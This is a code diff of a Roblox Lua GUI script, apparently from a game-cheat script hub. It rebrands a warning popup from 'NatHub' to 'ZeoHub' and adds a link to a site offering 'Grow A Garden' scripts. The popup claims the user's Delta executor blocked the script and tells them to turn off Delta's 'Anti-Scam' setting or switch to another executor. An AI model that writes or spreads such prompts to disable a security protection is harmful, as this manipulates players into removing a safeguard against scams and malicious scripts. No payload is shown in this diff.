@@ -12,12 +12,11 @@ gui.Name = "DeltaWarnUI"
 gui.IgnoreGuiInset = true
 
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 310, 0, 190)
-frame.Position = UDim2.new(0.5, -155, 0.5, -95)
+frame.Size = UDim2.new(0, 340, 0, 250)
+frame.Position = UDim2.new(0.5, -170, 0.5, -125)
 frame.BackgroundColor3 = BROWN
 frame.Active = true
 frame.Draggable = true
-
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
 Instance.new("UIStroke", frame).Color = DARK_BROWN
 
@@ -28,7 +27,7 @@ texture.Image = TILE_IMAGE
 texture.ScaleType = Enum.ScaleType.Tile
 texture.TileSize = UDim2.new(0, 96, 0, 96)
 
--- Top green bar
+-- Top bar
 local topBar = Instance.new("Frame", frame)
 topBar.Size = UDim2.new(1, 0, 0, 30)
 topBar.BackgroundColor3 = ACCENT_GREEN
@@ -67,7 +66,7 @@ close.MouseButton1Click:Connect(function() gui:Destroy() end)
 
 -- Main message
 local message = Instance.new("TextLabel", frame)
-message.Size = UDim2.new(1, -20, 0, 120)
+message.Size = UDim2.new(1, -20, 0, 148)
 message.Position = UDim2.new(0, 10, 0, 38)
 message.BackgroundTransparency = 1
 message.Font = FONT
@@ -76,12 +75,32 @@ message.TextStrokeTransparency = 0.4
 message.TextScaled = true
 message.TextWrapped = true
 message.TextYAlignment = Enum.TextYAlignment.Top
-message.Text = "Delta Executor detected.\n\nIf you're seeing this message, it means your executor blocked this script because the executor doesn't support the script.\n\nTo fix this:\n- Put your 'Anti-Scam' setting off in Delta\n- Or use a compatible executor like KRNL instead\n\nNatHub recommends KRNL for best results."
+message.Text = [[Delta Executor detected.
+
+If you're seeing this message, it means your executor blocked this script because the executor doesn't support the script.
+
+To fix this:
+- Put your 'Anti-Scam' setting off in Delta
+- Or use a compatible executor like KRNL instead
+
+ZeoHub recommends KRNL for best results.]]
+
+-- Website Label
+local zeoLink = Instance.new("TextLabel", frame)
+zeoLink.Size = UDim2.new(1, -20, 0, 24)
+zeoLink.Position = UDim2.new(0, 10, 1, -66)
+zeoLink.BackgroundTransparency = 1
+zeoLink.Font = FONT
+zeoLink.Text = "🌐 All versions of Grow A Garden scripts:\nhttps://zeohubweb.vercel.app/"
+zeoLink.TextColor3 = Color3.fromRGB(230, 255, 230)
+zeoLink.TextScaled = true
+zeoLink.TextWrapped = true
+zeoLink.TextStrokeTransparency = 0.5
 
 -- Copy button
 local copyBtn = Instance.new("TextButton", frame)
 copyBtn.Size = UDim2.new(0.9, 0, 0, 28)
-copyBtn.Position = UDim2.new(0.05, 0, 1, -36)
+copyBtn.Position = UDim2.new(0.05, 0, 1, -34)
 copyBtn.BackgroundColor3 = BLUE
 copyBtn.Font = FONT
 copyBtn.Text = "🔗 Copy KRNL Link"
